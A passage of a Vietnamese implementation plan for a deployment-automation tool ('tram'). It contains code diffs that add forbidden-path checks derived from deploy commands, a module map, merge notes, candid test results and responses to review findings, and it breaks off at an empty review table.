-    return sorted({p for p in cac_duong_dan if p.strip("/") not in mien and any(khop_mau(p, m) for m in mau)})
+    return sorted({p for p in cac_duong_dan if any(khop_mau(p, m) for m in bat_buoc)
+                   or (p.strip("/") not in mien and any(khop_mau(p, m) for m in mau))})
```

### File `tram/kiem/diff.py`

```diff
--- a/tram/kiem/diff.py
+++ b/tram/kiem/diff.py
@@ -11,7 +11,7 @@


 def _git(repo: Path, *args: str, chay=subprocess.run) -> bytes:
-    return chay([*GIT, "-C", str(repo), *args], capture_output=True, check=True).stdout
+    return chay([*GIT, "-C", str(repo), *args], capture_output=True, check=True, timeout=60).stdout


 def goc_nhanh(repo: Path, nhanh_chinh: str, commit: str, *, chay=subprocess.run) -> str:
@@ -32,6 +32,7 @@


 def diff_cham_cam(repo: Path, nhanh_chinh: str, commit: str, *, them: Iterable[str] = (),
-                  cho_phep: Iterable[str] = (), chay=subprocess.run) -> list[str]:
+                  cho_phep: Iterable[str] = (), bat_buoc: Iterable[str] = (), chay=subprocess.run) -> list[str]:
     goc = goc_nhanh(repo, nhanh_chinh, commit, chay=chay)
-    return duong_dan_cham_cam(tep_doi(repo, goc, commit, chay=chay), them=them, cho_phep=cho_phep)
+    return duong_dan_cham_cam(tep_doi(repo, goc, commit, chay=chay), them=them, cho_phep=cho_phep,
+                               bat_buoc=bat_buoc)
```

### File `tram/kiem/lenh_tho.py`

```diff
--- a/tram/kiem/lenh_tho.py
+++ b/tram/kiem/lenh_tho.py
@@ -33,14 +33,16 @@ def _git(wt: Path, *args: str) -> str:

 def kiem_sau_xong(wt: Path, phieu: Phieu, ban_giao: BanGiao, *, thu_muc_log: Path,
                   boc: Callable[[list[str]], list[str]], env: Mapping[str, str], them_cam: Iterable[str] = (),
-                  cho_phep_cam: Iterable[str] = (), thoi_gian_cho: float = 900,
+                  cho_phep_cam: Iterable[str] = (), bat_buoc: Iterable[str] = (), thoi_gian_cho: float = 900,
+                  loi_cam: str | None = None,
                   ket_luan_qc: str | None = None, kill: Callable[[int, int], None] | None = None) -> KetQuaKiemTho:
     if _git(wt, "status", "--porcelain"):
         raise ValueError("Worktree còn thay đổi chưa commit — thợ commit `wip: sau xong` trước khi kiểm")
     commit = _git(wt, "rev-parse", "HEAD")
-    cham = diff_cham_cam(wt, f"origin/{phieu.repo.nhanh_chinh}", commit, them=them_cam, cho_phep=cho_phep_cam)
+    cham = diff_cham_cam(wt, f"origin/{phieu.repo.nhanh_chinh}", commit, them=them_cam,
+                          cho_phep=cho_phep_cam, bat_buoc=bat_buoc)
     ket_qua, vuong = [], list(ban_giao.vuong_mac)
-    if not cham:
+    if not cham and not loi_cam:
         de_xuat = list(dict.fromkeys(l.lenh for l in ban_giao.lenh_kiem if l.lenh not in phieu.lenh_kiem))
         vuong += [f"Lệnh đề xuất không khớp lenh_cho_phep, không chạy: {l}" for l in de_xuat
                   if khop_bat_ky(l, phieu.lenh_cho_phep) is None]
@@ -56,6 +58,7 @@ def kiem_sau_xong(wt: Path, phieu: Phieu, ban_giao: BanGiao, *, thu_muc_log: Pat
     bg = BanGiao.model_validate({**ban_giao.model_dump(), "lenh_kiem": ket_qua, "luot": phieu.luot,
                                  "commit": commit, "vuong_mac": vuong})
     loi = [f"Diff chạm đường dẫn cấm: {', '.join(cham)}"] if cham else []
+    loi += [loi_cam] if loi_cam else []
     loi += kiem_ban_giao(bg, phieu.tieu_chi, wt, lenh_bat_buoc=phieu.lenh_kiem, can_lenh_kiem=phieu.can_lenh_kiem,
                          commit=commit, la_qc=phieu.buoc == "qc", ket_luan_qc=ket_luan_qc)
     return KetQuaKiemTho(bg, loi, cham)
```

### File `tram/giao_viec/kiem_lai.py`

```diff
--- a/tram/giao_viec/kiem_lai.py
+++ b/tram/giao_viec/kiem_lai.py
@@ -49,10 +49,11 @@
              don_sach: Callable[[], None] | None = None,
              kill: Callable[[int, int], None] = _kill_nhom,
              cong: CongLuot | None = None, boc_luot: Callable[[Path], Boc] | None = None,
-             chu_dau: bool = False) -> KetQuaKiemLai:
+             chu_dau: bool = False, them_cam: tuple[str, ...] = ()) -> KetQuaKiemLai:
     if not chu_dau and cong_dong(tram_home() / "kiem-lai.dong"):      # H6: trước mọi bước, kể cả spike tài liệu
         raise LoiBanChep("dấu hạn tổng kiem-lai.dong còn: harness chưa xác nhận dọn — Đại ca kiểm tay rồi xoá dấu")
-    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", commit, them=du_an.giao.duong_dan_cam,
+    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", commit,
+                         them=du_an.giao.duong_dan_cam, bat_buoc=them_cam,
                          cho_phep=du_an.giao.duong_dan_cam_cho_phep)
     if cham:
         return KetQuaKiemLai(False, (), tuple(cham), "dong-file-cau-hinh")
```

### File `tram/giao_viec/xet_spec.py`

```diff
--- a/tram/giao_viec/xet_spec.py
+++ b/tram/giao_viec/xet_spec.py
@@ -50,12 +50,14 @@
     return loi + (["commit trong khối bàn giao khác SHA công bố"] if bg.commit != sha else [])


-def xet_xong_spec(kho_git: Path, phieu: Phieu, bao: dict, sha: str | None, du_an: DuAn) -> KetLuanSpec:
+def xet_xong_spec(kho_git: Path, phieu: Phieu, bao: dict, sha: str | None, du_an: DuAn, *,
+                  them_cam: tuple[str, ...] = ()) -> KetLuanSpec:
+    """`them_cam` (TM-3, D89): mẫu cấm từ ba lệnh deploy của dự án, cộng vào đường dẫn cấm."""
     if sha is None:
         return KetLuanSpec("chua-cong-bo", ("Lượt này chưa có commit trạm công bố",), None)
     if bao.get("commit") != sha:
         return KetLuanSpec("commit-khong-cong-bo", (f"bao.xong mang {bao.get('commit')}, ref công bố là {sha}",), None)
-    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", sha, them=du_an.giao.duong_dan_cam,
+    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", sha, them=du_an.giao.duong_dan_cam, bat_buoc=them_cam,
                          cho_phep=du_an.giao.duong_dan_cam_cho_phep)
     if cham:
         return KetLuanSpec("dong-file-cau-hinh", (f"Diff chạm đường dẫn cấm: {', '.join(cham)}",), sha, tuple(cham))
```

### File `tram/giao_viec/xet_xong.py`

```diff
--- a/tram/giao_viec/xet_xong.py
+++ b/tram/giao_viec/xet_xong.py
@@ -48,10 +48,12 @@
         return None


-def xet_xong_code(kho_git: Path, phieu: Phieu, bao: dict, sha: str | None, du_an: DuAn) -> KetLuan:
+def xet_xong_code(kho_git: Path, phieu: Phieu, bao: dict, sha: str | None, du_an: DuAn, *,
+                  them_cam: tuple[str, ...] = ()) -> KetLuan:
+    """`them_cam` (TM-3, D89): mẫu cấm từ ba lệnh deploy của dự án, cộng vào đường dẫn cấm."""
     if (kl := _cong_bo(bao, sha)) is not None:
         return kl
-    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", sha, them=du_an.giao.duong_dan_cam,
+    cham = diff_cham_cam(kho_git, f"origin/{du_an.nhanh_chinh}", sha, them=du_an.giao.duong_dan_cam, bat_buoc=them_cam,
                          cho_phep=du_an.giao.duong_dan_cam_cho_phep)
     if cham:
         return KetLuan("dong-file-cau-hinh", (f"Diff chạm đường dẫn cấm: {', '.join(cham)}",), sha, tuple(cham))
```

### File `tram/giao_viec/tick_pipeline.py`

```diff
--- a/tram/giao_viec/tick_pipeline.py
+++ b/tram/giao_viec/tick_pipeline.py
@@ -6,6 +6,7 @@
 from pathlib import Path

 from tram.cau_hinh.du_an import DuAn
+from tram.deploy.cam import cam_tu_lenh
 from tram.duong_dan import tram_home
 from tram.giao_viec.dieu_kien import ASSIGNEE, ly_do_khong_giao
 from tram.giao_viec.escalation import tao_escalation
@@ -42,7 +43,8 @@
                   lenh_cho_phep=list(p.lenh_cho_phep),
                   chay_lenh=p.can_lenh_kiem, thu_muc=bo.thu_muc_kiem or tram_home() / "kiem",
                   thu_muc_log=tram_home() / "log" / "kiem-lai", boc=bo.boc or (lambda a: a), env_goc=bo.env_goc,
-                  don_sach=bo.don_sach, kill=bo.kill, cong=bo.cong, boc_luot=bo.boc_luot)
+                  don_sach=bo.don_sach, kill=bo.kill, cong=bo.cong, boc_luot=bo.boc_luot,
+                  them_cam=cam_tu_lenh(kho.db, kg, da, sha))
     if kq.loi is not None:
         tao_escalation(bd, kho, da.ten, b, ly_do=kq.loi, cau_hoi="", giao_id=p.giao_id, nguon=f"kl-{sha}", luc=luc)
         if kq.loi in ("thieu-moi-truong-kiem", "cay-khac-nguon"):
```

### File `tram/giao_viec/xu_ly_viec.py`

```diff
--- a/tram/giao_viec/xu_ly_viec.py
+++ b/tram/giao_viec/xu_ly_viec.py
@@ -7,6 +7,7 @@
 from pathlib import Path

 from tram.cau_hinh.du_an import DuAn
+from tram.deploy.cam import cam_tu_lenh
 from tram.giao_viec.escalation import LY_DO_BI, LY_DO_HOI, ma_escalation, tao_escalation
 from tram.giao_viec.su_kien import cong_bo_cua_luot, da_co, ghi_mot_lan, moi_nhat, su_kien_bead
 from tram.giao_viec.xet_spec import xet_xong_spec
@@ -30,7 +31,8 @@
         return d.get("ly_do") or cv.ket_thuc, (), None, None             # het_han_muc, thu_hoi: giao lại
     sha = cong_bo_cua_luot(ds, p.luot)
     if p.buoc in ("code", "spec"):                                       # spec: 4b — §7.2
-        kl = (xet_xong_code if p.buoc == "code" else xet_xong_spec)(kho_git, p, d, sha, du_an)
+        cam = cam_tu_lenh(kho.db, kho_git, du_an, sha) if sha else ()      # TM-3, D89
+        kl = (xet_xong_code if p.buoc == "code" else xet_xong_spec)(kho_git, p, d, sha, du_an, them_cam=cam)
         esc = ("dong-file-cau-hinh", f"Diff chạm: {', '.join(kl.cham_cam)}") if kl.cham_cam else None
         return kl.ly_do, kl.loi, kl.commit, esc
     kq = xet_xong_qc(kho_git, p, d, sha)
```

### File `tram/tho/ket_thuc.py`

```diff
--- a/tram/tho/ket_thuc.py
+++ b/tram/tho/ket_thuc.py
@@ -6,6 +6,7 @@ import time

 from tram.ban_giao.schema import BanGiao
 from tram.cau_hinh.du_an import nap_du_an
+from tram.deploy.cam import LOI_CAM, cam_tu_lenh_tho
 from tram.giao_viec.khoi_qc import doc_khoi_qc
 from tram.kiem.chay_lenh import moi_truong_kiem
 from tram.kiem.lenh_tho import kiem_sau_xong
@@ -59,8 +60,15 @@ def ket_thuc_xong(pc: PhieuDangChay, nc: NguCanhTho, dong: dict) -> str:
         k = doc_khoi_qc((pc.wt / bg.file_ban_giao).read_text(encoding="utf-8", errors="replace"))
         ket_luan = k.ket_luan if k else None
     giao = nap_du_an(p.du_an).giao
+    cam, loi_cam = (), None
+    try:
+        cam = cam_tu_lenh_tho(nc.khach, p.du_an, pc.wt, p.repo.nhanh_chinh)
+    except OSError:
+        loi_cam = LOI_CAM
     kq = kiem_sau_xong(pc.wt, p, bg, thu_muc_log=nc.goc / "log" / "kiem", boc=pc.principal.boc,
-                       env=moi_truong_kiem({"PATH": ch.path_cli, "LANG": "C.UTF-8"}), them_cam=giao.duong_dan_cam,
+                       env=moi_truong_kiem({"PATH": ch.path_cli, "LANG": "C.UTF-8"}),
+                       them_cam=giao.duong_dan_cam,
+                       bat_buoc=cam, loi_cam=loi_cam,
                        cho_phep_cam=giao.duong_dan_cam_cho_phep, thoi_gian_cho=ch.thoi_gian_cho_kiem_giay,
                        ket_luan_qc=ket_luan, kill=pc.principal.kill_nhom)
     cb = _day(pc, nc, kq.ban_giao.commit, time.monotonic() + ch.han_chot_dung_mem_phut * 60)
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_deploy_cam.py tests/test_deploy_review_v2.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 9: Bản đồ module

**Files:** `docs/MODULES.md`

**Bằng chứng phiên này:** Docs giữ phần TM-2; không đánh dấu OpenSpec tasks hoàn thành khi kiểm toàn bộ còn thiếu.

- [ ] Áp test, chạy đỏ trước mã.

### File `docs/MODULES.md`

```diff
--- a/docs/MODULES.md
+++ b/docs/MODULES.md
@@ -30,7 +30,7 @@
 | `tram/phieu/` | kho phiếu: khe, máy thợ, lượt, giữ ngân sách, cầu dao hạn mức, mã ghép |
 | `tram/han_muc/` | đọc hạn mức CLI, ngưỡng ngừng |
 | `tram/usage/` | đếm usage (ccusage tuỳ chọn) |
-| `tram/giao_viec/` | vòng tick, pipeline theo loại bead, chọn khe, kiểm lại, QC, luồng feature, PR, tự merge có điều kiện (`tu_merge*.py`, `gh_tu_merge.py`), xác minh merge; harness S6 (chứng cứ từng nguồn lịch `chung_cu_probe.py`), ống `git archive \| tar` có chủ hai đầu (`ong_chep.py`) |
+| `tram/giao_viec/` | vòng tick (ba pha, ba luồng: nhanh, Git, deploy), tự merge (`tu_merge.py`, `tu_merge_rao.py`, `tu_merge_gui.py`), pipeline theo loại bead, chọn khe, kiểm lại, QC, luồng feature, PR, xác minh merge; harness S6 (chứng cứ từng nguồn lịch `chung_cu_probe.py`), ống `git archive \| tar` có chủ hai đầu (`ong_chep.py`) |
 | `tram/tho/` | tiến trình quản lý thợ: đăng ký, nhịp tim, chạy CLI dưới principal, sandbox, worktree, bàn giao; dọn theo UID của khe (`don_uid.py`), chấm thăm dò cách ly (`cham_tham_do.py`) |
 | `tram/chay_cli/` | dựng lệnh `claude -p` / `codex`, đọc stream, quyền theo vai |
 | `tram/kiem/` | chạy lệnh có giới hạn, cây tiến trình, danh tính UID, vòng đời tiến trình, đường cấm; hợp đồng sở hữu tiến trình con (`so_huu.py`), hoãn ngắt (`ngat.py`), bảng tiến trình của nhân (`bang_tien_trinh.py`), giữ xác gốc (`giu_xac.py`), gửi tín hiệu nhóm (`gui_tin.py`) |
@@ -38,8 +38,9 @@
 | `tram/ban_giao/` | schema và đọc file bàn giao của agent |
 | `tram/nho/` | memory service + MCP (cổng 7710): tách/gộp ký ức, embed, quét bí mật, thăng cấp, phạm vi |
 | `tram/yeu_cau/` | sổ tiếp nhận phiếu yêu cầu feature từ máy A |
-| `tram/thao_tac/` | thao tác ghi từ dashboard: chốt, duyệt spec, kéo cột, estop, khe, cài đặt tự động và TẠM DỪNG (`tu_dong.py`) |
+| `tram/thao_tac/` | thao tác ghi từ dashboard: chốt, duyệt spec, kéo cột, estop, khe, cài đặt tự động và TẠM DỪNG (`tu_dong.py`), nút Deploy (`deploy.py`) |
 | `tram/tu_dong/` | tự merge / tự deploy: cài đặt theo dự án lưu bằng sự kiện (`luu.py`), kiểm lệnh (`cai_dat.py`), khoá chung trước thao tác tự động (`khoa.py`), đường cấm từ ba lệnh (`file_cam.py`) |
+| `tram/deploy/` | tự deploy (pha `vong_deploy`): trạng thái tính từ sự kiện (`trang_thai.py`, `hien_thi.py`), chạy một lệnh có hạn + log đã che bí mật (`lenh.py`, `ong.py`), Git có hạn (`git.py`), chuỗi deploy → kiểm còn sống → lùi (`chuoi.py`), ghi `deploy.*` (`ghi.py`), một vòng của một dự án (`vong.py`, `chay.py`), đường cấm từ ba lệnh nối vào kiểm đường cấm (`cam.py`) |
 | `tram/suy/` | tính trạng thái hiển thị từ sự kiện + beads |
 | `tram/api/` | tram-api: router, bảo mật, kênh ghi, API thợ, ghép máy, nội bộ, điều phối |
 | `tram/chu/` | lệnh trạm chủ: cài từng dịch vụ launchd kèm biên nhận, gỡ theo biên nhận (`go_dich_vu.py`, `chung_cu_go.py`), khôi phục kho sự kiện (`khoi_phuc_su_kien.py`), siết quyền `~/.tram` (`siet_quyen.py`), estop, cấp mã, kiểm cách ly, trạng thái |
@@ -61,6 +62,7 @@
 | `ccusage` | đếm usage (tuỳ chọn) | 60 giây | trang Usage báo chưa biết |
 | `security` (Keychain) | lấy khoá | 10 giây (`tram/keychain.py`) | đọc lỗi hay quá hạn: coi như chưa có khoá, dịch vụ báo thiếu token; kiểm tồn tại lỗi: dừng, không tạo khoá thay |
 | `sudo -u`, `sandbox-exec` | chạy dưới principal, cách ly | theo `tram/kiem/` | cổng đóng |
+| Ba lệnh deploy / kiểm còn sống / lùi của dự án | tự deploy (`tram/deploy/`), dưới tài khoản trạm, không qua shell | 15 / 2 / 15 phút (`tram/deploy/lenh.py` `HAN`), quá hạn giết cả nhóm tiến trình | hỏng: tự lùi, tin "đã tự lùi"; 3 lần liên tiếp: tự tắt tự deploy; lùi hỏng: tắt + tạm dừng dự án, tin khẩn; không rõ kết quả: tạm dừng dự án, không chạy lại; đầu ra chỉ ở `~/.tram/deploy-log/` (0600, đã che bí mật, giữ 30 ngày) |
 | `launchctl` | cài/gỡ dịch vụ trạm chủ | 30 giây mỗi lệnh (`tram/chu/dich_vu_tram.py`); `cai-dat-tho` chưa đặt | dừng, lệnh sau không chạy, thoát 3 |
 | `brew`, `ollama pull` | cài memory | install 30 phút, services 60 giây, pull 60 phút (`tram/chu/cai_dat_nho.py`) | quá hạn: dừng kế hoạch, thoát 3; đối soát cây con ở cổng |

```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Ghép trên lát trước

TM-1 vòng 2 từ `85ce7f4` (plan `874e7c4`), TM-2 từ plan vòng 2 ở `sua-tm2`.
Không chép lại `file_cam` cũ. TM-2 đã kiểm tập cấm D89 đọc tươi sát merge trong `tu_merge_rao.py` (Q2);
TM-3 thêm các cửa còn lại, không gỡ bước đó. Chạy lại test Q2 của TM-2 sau ghép.

| File chung | Hợp nhất |
|---|---|
| `tram/api/tuyen_tu_dong.py` | TM-1 + TM-2: **104 dòng**, TM-3 không sửa; Deploy chuyển sang router mới |
| `tram/api/app.py` | Giữ đăng ký TM-1, thêm import và đăng ký `tuyen_deploy.router` |
| `tram/suy/tu_dong.py` | Giữ `TieuDe`, `cho_dai_ca`, tham số `tieu_de`; thêm gọi `tom_tat_deploy`, `chi_tiet_deploy` |
| `tests/test_api_tu_dong.py` | Giữ test TM-1/TM-2, mở rộng dict tổng hợp với `san_sang`, `dem_hong` |
| `docs/MODULES.md` | Giữ package/tích hợp tự merge của TM-2, thêm package deploy và ba pha |
| OpenSpec tasks | Giữ đánh dấu TM-1/TM-2; chưa đánh dấu TM-3 trước khi đạt kiểm chứng |

Nội dung hợp nhất **toàn file** `tram/suy/tu_dong.py` (không áp thêm lần hai):

```python
"""Trạng thái hiển thị của tự merge / tự deploy (`dieu-khien-tu-dong`, design D-5) — tính lúc đọc từ sự kiện.
TM-2 (việc chờ kèm lý do), TM-3 (sẵn sàng deploy, lịch sử, bộ đếm hỏng) THÊM khoá vào hai bảng này, không đổi khoá
có sẵn."""
from tram.suy.deploy import chi_tiet_deploy, tom_tat_deploy
from tram.su_kien.kho import KhoSuKien
from tram.suy.tu_merge import TieuDe, cho_dai_ca  # TM-2
from tram.tu_dong.cai_dat import KHOA_CUNG, sang_api
from tram.tu_dong.luu import DU_AN_TRAM, TamDung, doc_trang_thai, lich_su_doi, tam_dung_cua


def tam_dung_api(td: TamDung | None) -> dict | None:
    return None if td is None else {"boi": td.boi, "luc": td.luc, "ly_do": td.ly_do}


def chung(kho: KhoSuKien, *, kenh_ghi: str, la_dai_ca: bool, estop_bat: bool) -> dict:
    """Phần chung của mọi GET: `chi_tam_dung` (D87) — dashboard khoá mọi nút trừ TẠM DỪNG, kèm giải thích."""
    return {"tam_dung_tram": tam_dung_api(tam_dung_cua(kho.db, DU_AN_TRAM)), "estop": estop_bat, "kenh_ghi": kenh_ghi,
            "chi_tam_dung": kenh_ghi == "header", "la_dai_ca": la_dai_ca}


def tom_tat_du_an(kho: KhoSuKien, ten: str, *, bat_ghi: bool) -> dict:
    tt = doc_trang_thai(kho.db, ten)
    return {"ten": ten, "bat_ghi": bat_ghi, "tu_merge": tt.cai_dat.tu_merge, "tu_deploy": tt.cai_dat.tu_deploy,
            "du_lenh": tt.cai_dat.du_lenh, "tam_dung": tam_dung_api(tt.tam_dung_du_an),
            **tom_tat_deploy(kho.db, ten)}


def chi_tiet_du_an(kho: KhoSuKien, ten: str, *, bat_ghi: bool, tieu_de: TieuDe = dict) -> dict:
    tt = doc_trang_thai(kho.db, ten)
    return {"du_an": ten, "bat_ghi": bat_ghi, "cai_dat": sang_api(tt.cai_dat), "du_lenh": tt.cai_dat.du_lenh,
            "phien_ban": tt.phien_ban, "tam_dung": tam_dung_api(tt.tam_dung_du_an), "khoa_cung": list(KHOA_CUNG),
            "lich_su_doi": lich_su_doi(kho.db, ten),
            "cho_dai_ca": cho_dai_ca(kho.db, ten, tieu_de) if tt.cai_dat.tu_merge else [],  # TM-2: tắt → []
            **chi_tiet_deploy(kho.db, ten)}
```

Nội dung tuyến chi tiết hợp nhất của `tram/api/tuyen_tu_dong.py` (104 dòng toàn file):

```python
from tram.suy.tu_merge import tieu_de_bead  # TM-2

@doc.get("/api/du-an/{ten}/tu-dong")
def r_chi_tiet(ten: str, request: Request) -> dict:
    pt = request.app.state.pt
    kiem_du_an_bead(pt, ten)
    with closing(pt.mo_kho()) as kho:
        return {**_chung(request, kho), **chi_tiet_du_an(kho, ten, bat_ghi=_bat_ghi(pt, ten),
                                                         tieu_de=tieu_de_bead(pt.bo_dem, ten))}
```

Các module TM-3 mới/đổi kiểm bằng `tests/test_do_dai_ma.py`; callback D89 có chữ ký mới,
`kiem_lai.py` và `lenh_tho.py` truyền tập bắt buộc riêng. Không sửa cửa danh tính, bộ quét bí mật hay schema.

## Kiểm chứng plan vòng 2

Các số 3412/3474 của vòng 1 đã bỏ: không phải bằng chứng cho bản vòng 2.
- C2 trước sửa: **5 failed, 2 passed**, 0 dòng chặn mới; sau sửa toàn nhóm chức năng **60 passed in 8.29s**,
  0 dòng chặn mới, 2 điểm mù Python con, 25 push giả lập (không push thật).
- Điều phối Q4/Q6/Q8 với biên giả: **8 passed in 4.15s**, 0 dòng chặn mới, 18 push giả lập.
- Runner và bộ lọc: **7 passed, 3 failed, 1 deselected in 26.54s**, 0 dòng chặn mới.
  Ba ca thất bại đòi xác nhận thu hồi; `/bin/ps` trả `Operation not permitted` trong sandbox.
  Không sửa primitive để giả xanh, không bỏ các assertion thu hồi. Ca output lớn còn phải chạy riêng.
- N₀ và cả bộ sau lát: chưa có một kết quả hoàn tất xanh. Đo nền trên HEAD và ghi kết quả bên dưới.
- Áp lại từ chính khối mã và đối chiếu byte: ghi kết quả bên dưới sau khi thực hiện.

## Bảng cổng G8 — chưa chạy, từng kịch bản cần cho phép chạy thật

| Mã | Thử trên repo nháp | Bằng chứng phải lưu |
|---|---|---|
| G8-D1 | Deploy từ Tự động và Phê duyệt, cùng endpoint, đúng commit | Request/response, sự kiện một lần; thiếu/giả danh tính bị từ chối |
| G8-D2 | In token giả khi đang chạy, timeout, SIGINT và trạm chết | Không file nào chứa token thô, log 0600 ngay lúc tạo (umask 000), không file tạm |
| G8-D3 | Output liên tục/dòng rất dài, con cháu giữ ống | RAM/log có trần, timeout không bị output làm đói, cây được thu hồi, khoá được nhả |
| G8-D4 | Treo riêng rev-parse, merge-base, worktree add/remove/prune | Mỗi lệnh hết hạn; không giữ pha deploy vô hạn; ghi trạng thái lỗi dọn/chuẩn bị |
| G8-D5 | Đổi estop, tạm dừng, `bat_ghi`, công tắc lúc dựng bản sạch | Chưa ghi bắt đầu thì không chạy; bắt đầu rồi làm nốt D97 |
| G8-D6 | m6 merge khi đang tạo worktree m5; m6 fetch trước/sau cửa tươi | Tập phủ m5 không chứa m6; m6 vẫn chờ hoặc cả chuỗi hoãn để chạy m6 |
| G8-D7 | Merge/đẩy thẳng trước nút Deploy và trước chạy | 409 khi nhận; huỷ yêu cầu cũ khi đã nhận; không âm thầm deploy bản cũ; đo độ tươi ref kho kiểm |
| G8-D8 | Tạm dừng → sẵn sàng → tiếp tục; đối chiếu bật công tắc từ tắt | Q8 giữ trigger; D123 vẫn chờ bấm |
| G8-D9 | Deploy hỏng, lùi hỏng, ba lần hỏng và mất điện | D115/D124/D126, tin khẩn, tạm dừng cả dự án, không tự thử lại |
| G8-D10 | File ba lệnh trong `cho_phep` ở mọi cửa, đổi lệnh sát merge | C2/Q2 đều chặn; token tuyệt đối trong repo không được miễn |

Điều kiện: các lát đã ghép/QC, cửa ghi thật theo quyết định hiện hành, repo nháp và script do Đại ca chỉ định;
không chạy kịch bản lên môi trường khách. Cổng này không thay thế test offline còn thiếu.

## Phản hồi review Codex vòng 1

| Finding | Sửa | Đỏ thật / kiểm chứng | Trạng thái |
|---|---|---|---|
| C1 | Task 2: bỏ file thô, ống, trần dòng/log, open 0600; sở hữu P1 | Lộ token trong `.tam` trên mã cũ; bộ lọc xanh, thu hồi OS còn lỗi môi trường | Chưa đủ bằng chứng đóng |
| C2 | Task 8: `bat_buoc` tách `cho_phep`, đủ sáu cửa | Code/spec/kiểm lại ngoại lệ làm lọt; test phía thợ sau sửa chặn trước runner | Đã kiểm nhóm chức năng |
| Q1 liên đới | Callback trả `(rel, loại)`, nhận tuyệt đối, gốc tin cậy | Test alias/symlink từng đỏ, đã sửa và xanh | Đã kiểm |
| Q2 liên đới | Giữ cửa D89 mới của TM-2 trước merge | TM-3 không thay thế hay miễn kiểm TM-2 | Cần chạy lại sau ghép đủ TM-2 |
| Q4 | `chay.chuoi`: đọc tươi sát ghi bắt đầu | Test đổi 5 loại khoá tại tạo worktree xanh với biên giả | Chưa chứng minh OS |
| Q5 | `deploy.git`: mọi chuẩn bị/dọn qua P1 timeout 60; diff cũ thêm timeout | Test treo có sẵn nhưng sandbox cấm ps | Chưa đủ bằng chứng đóng |
| Q6 | Tập `bao_gom`, kiểm quan hệ commit; không dùng watermark thời gian | m6 ghi lúc tạo m5, test trạng thái và biên giả xanh | Đã kiểm logic |
| Q7 | Git + merge chưa ghi nhận lúc nhận; đỉnh kiểm lại trước chạy | API cũ trả 200, bản mới 409; huỷ có lịch sử D127 | Đọc remote có hạn; OS/GitHub cần G8-D7 |
| Q8 | `cho` phân biệt tạm dừng với tự deploy tắt | Chuỗi tạm dừng/tiếp tục xanh với biên giả | Đã kiểm logic |
| Q15 | Router/hiển thị module mới; hunk giữ TM-2 | Trần dòng, import và API nhóm 60 xanh trước ghép đầy đủ | Kiểm seam bổ sung bên dưới |

Không còn câu hỏi sản phẩm đã được D115/D116/D123–D127/D129 trả lời.
Giới hạn còn lại: bộ quét regex không nhận mọi bí mật tự do; D89 không truy vết phụ thuộc gián tiếp của script;
không được coi đây là lý do bỏ test token nhận diện được. Không có thay đổi chạy thật hay commit trong phiên này.

### Kết quả kiểm cuối phiên

- Nền HEAD (nội dung file đã hoàn nguyên, `tests/chan_host/chay.sh -q -x`):
  **139 passed, 1 failed in 20.64s**; dừng tại `test_ban_chep_dung_commit_co_repo_git_khong_bi_export_ignore_giau`,
  `LoiBanChep: ... không xác nhận thu hồi cây tiến trình`. Đây **không phải N₀ hoàn tất**.
- Sau lát và seam TM-2 (`-q -x`): **151 passed, 1 failed in 20.03s**, cùng lỗi nền, 0 dòng chặn mới.
  Chưa chạy hết cả bộ; cần đo lại N₀ trên nền TM-1 v2 + TM-2 đầy đủ trong môi trường cho đọc bảng tiến trình.
- Áp lại khối mã trong plan: **42 file, 0 khác biệt byte** với snapshot. File chung hợp nhất:
  `tram/suy/tu_dong.py` **34 dòng**, `tram/api/tuyen_tu_dong.py` **104 dòng**.
- Nhóm chức năng + seam TM-2: **81 passed in 12.52s**, 0 dòng chặn mới, 2 điểm mù, 43 push giả lập.
  Phạm vi seam: `suy/tu_merge.py`, `tu_merge_xet.py`, hai file chung API/suy và test suy TM-2;
  không phải đã áp/chạy toàn bộ lát TM-2.
- Sau bổ sung đọc đỉnh remote: **23 passed in 5.39s**, 0 dòng chặn mới;
  gồm race, API và trần dòng. Không gọi GitHub: repo của test là bare cục bộ, API dùng nguồn giả.
- Chưa đủ bằng chứng đóng toàn bộ vòng 2: C1 thu hồi thật/Q5/G8, cả bộ và N₀ vẫn chờ môi trường phù hợp.
  Không có quyết định hoãn lỗi sản phẩm; đây là giới hạn kiểm chứng của phiên, plan chưa được đánh dấu ĐẠT.

### Bàn giao cây làm việc

Lệnh `git restore --source=HEAD --staged --worktree -- docs/MODULES.md tram tests` bị sandbox từ chối tạo
`/Users/dai-ca/Developer/Ben Station/.git/worktrees/sua-tm3/index.lock` (ngoài writable roots).
Nội dung file ngoài plan được hoàn nguyên bằng bản HEAD và xoá file tạm mới. Ba mục staged do agent trước để lại
(`tests/test_chong_on_tu_dong.py`, `tests/test_tu_dong_khoa.py`, `tram/bao_tin/chong_on.py`) chưa thể gỡ khỏi index;
working-tree của chúng đã về HEAD. Không commit; không tạo báo cáo riêng để giữ phạm vi một file plan.

## Phản hồi review Codex vòng 2

Phiên sửa vòng **3/3**, ngày 18/10/2026, HEAD `e3ad034`; không commit. Đã đọc hết
`REVIEW-CODEX-tm-vong2.md`, đối chiếu các hợp đồng TM-0/1/2/4/TC trong `review-tm2/docs/plans/`
và mã TM-1 bằng `git show 85ce7f4:<file>`. Chỉ sửa ba finding của TM-3; không kết luận thay
review cuối của người điều phối và không mở cổng chạy thật.

| Mã | Sửa ở đâu | Test tái hiện và kết quả thật |
|---|---|---|
